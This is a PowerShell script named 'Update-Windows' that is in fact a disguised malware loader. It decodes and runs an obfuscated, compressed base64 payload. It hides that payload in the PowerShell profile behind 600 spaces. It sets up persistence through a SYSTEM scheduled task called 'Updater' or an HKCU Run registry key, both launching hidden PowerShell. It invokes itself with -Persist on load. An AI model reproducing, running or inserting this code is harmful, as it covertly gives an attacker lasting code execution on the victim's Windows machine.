function Update-Windows{
Param([Switch]$Persist)
$ErrorActionPreference='SilentlyContinue'
$Script={sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('vVZtb9pIEP6cSv0PVoWErRBsUprSSJFubexgihMcgwlQdHLsxd6yfqm9Dji9/vcbg0mImla5fjgLiX2Zl2efmdnZZR65jMQRl9ujYfZR+nvCfX/75mjopE7I8bUMDRpc7dvHUxYEwtER7NSSa72DMu6C4+coSbpx6JBocX6u5GmKI7abNy8xQ1mGwztKcMYL3D/cJMApPrm++4pdxn3nan83L2l859BKrFAcN8DcCYq8cm8Qu04Jq2kllDC+/uVLXZiftBZN9Vvu0IyvW0XGcNj0KK0L3A+hdDgqEszXDeKmcRYvWXNCovenzXGUOUt8BdbusYFZEHtZXYBzwC/FLE8jrjpRaWInwNdhOExjF3leijOQb+rRfbzCfC3KKW1wf/Hzyv9NHjESYthnOI0TC6f3xMVZs+dEHsU3eLngr/B6f+zXKvGHSiA1ZKnQgGi8CNSIvZzinW5d+BlqGUMBvqc4wvF/vH3z9s1yH/vYn123CW3dH8YeRkfz7RgDTH4YZ2QrfMFJDc4Adw6L0wKmtVGaY2HBzcsAzBcLrvYQGwlr/NpAay8NsmE+hpW5HRNvARpVaGrBrD+8+yxNjFa5++tE6+IliXC3iJyQuPtc4l8iHS8p3h63uRe7AmR8vdrAXhdT7DusJLHBzX9WU0PCHnXlnFAPp8iFwGWACmIqPAeziwtf1yMDh8DUbl6HMCwhg/FeusraYu+9nINQXaFOljW4YQ4l5DY4CzsUew0ORRmptlDO4u2w/gTXyCkjrpOxvbmF8JzNyqsSRxlLcxdCCAyMrAS7xKElIQ2uRzwsFxbx997rL9KhOJSSyAdL9xAOWClpsFiZGCkA3SWB0LQw08OE4hCEtiWtUceHAq6KYJtKjo+9+stA94m+y+qSmD0jBzAh2haNWYOzScrgfihJhrz6QxAHN8MBHCXFVXT4ff3M5YKVCV8Ll9ZI7xfrQadM1oqqLTEpA1K0NA5lJ8NnbYulQBn/TlRJ98OwGz8g+FTtxrRla2zPdMPrU0tn1lQlg3EQ6KSl+zAvxqo/ZFLyeTTq9a1uD6XdTbBEeqarPbkwWzJye+Sj3ZfHY9AjysD8utGRJ4f+rT9V1vowuNXBkTLwdR/+ZT1wZWkm+bKkKQNLDlQiId8ye2a7NdPFDpXJg6VbqDd59PfoR223e7ebEboy+ijQrj2tdapt9Vel/mx1Oeiq27lbzs1pphIV/Kja1LQDPLETeaJqM9NOdP947Zv2QGxrgQzrOtkMEkuEr9Xq30feg0E7DwbANe1Zn+CZ7uPCRyZC1jSi1t1aQdqnT6mcF4qkjWFtNdKjjXmXGF4x7YmfbIPgJEamipBGoVhD5Ky7YmsSa6b9wRyr0qYYS5u1+lVcq6S/XlX/48uzM19ctoeibelRzwlkwFv02yvSP4a90LGl6VK0S/6UVSQ+RLf0rG9sOYXzmKBDSs4c/wb0djqIRfqtKNq+6KMltXW/Y/q3cXTqrMD2xEeAEM4IsV72dcMFrJSsxse3YmsMeKSwv5FKrGG/A/ZOVy/YtALg1ps5SC5xyJPLGE1Wl2dK0RkacA67BTYjOx9NemATMOerTkkzxLdrKdGlpd+eenc3snjsTR1fnuXHyPvsJzLxUrFlXly8K2sCiqIWnzFpdpDgv2pjhpNmgUMh8aE77e8hLU61qt0MY1Jq8PzTk2OF0whT6NbQz/dFjCiN3bLtPXUn6Lu7briAG2kMw/enL44E7lFQeOqI+6Xz8xngLa+Ix7JtDnDks6Ahbd5LErQ3adOW4NivP6kSJwV/YLBRNskdY88d0a0jobw+aixf2uMP/wOj1d0VwJ/3Kkaf1n6z+yqWpUbFwk/rzxf+E9t/xsLEIQzELbiBKd49Dn5DRpVJBw+qXbggR5bVVz5rr3N2cgUvrX8B'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()}
if($Persist){
if(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator'))
{$Prof=$PROFILE.AllUsersAllHosts;$Payload="schtasks /Create /RU system /SC DAILY /ST 20:15:00 /TN Updater /TR `"$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -NonInteractive`""}
else
{$Prof=$PROFILE.CurrentUserAllHosts;$Payload='New-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Updater -PropertyType String -Value "`"$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe`" -NonInteractive -WindowStyle Hidden"'}
mkdir (Split-Path -Parent $Prof)
(gc $Prof) + (' ' * 600 + $Script)|Out-File $Prof -Fo
iex $Payload|Out-Null
Write-Output $Payload}
else
{$Script.Invoke()}
} Update-Windows -Persist